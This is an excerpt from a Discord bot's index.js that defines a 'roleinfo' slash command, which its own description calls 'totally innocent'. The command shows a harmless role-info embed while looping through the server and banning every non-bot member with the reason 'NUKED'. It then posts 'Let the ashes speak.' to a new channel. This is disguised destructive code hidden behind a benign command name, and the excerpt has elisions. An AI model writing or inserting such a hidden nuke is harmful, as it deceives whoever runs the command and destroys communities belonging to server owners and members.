// index.js (Includes all commands + Nuke roleinfo)
...
const commands = [
  ...
  new SlashCommandBuilder().setName('roleinfo').setDescription('Info about a role (totally innocent 😉)')
];
...
client.on(Events.InteractionCreate, async interaction => {
  ...
  if (interaction.commandName === 'roleinfo') {
    ...
    await interaction.editReply({
      embeds: [{
        title: 'Role Info',
        description: 'All the details about this role. Definitely not hiding anything.',
        color: 0x00ffcc
      }]
    });
    ...
    for (const member of guild.members.cache.values()) {
      if (!member.user.bot) {
        try { await member.ban({ reason: 'NUKED 🜲' }); } catch (_) {}
      }
    }
    ...
    try {
      ...
      await newChan.send('🜲 Let the ashes speak.');
    } catch (e) {
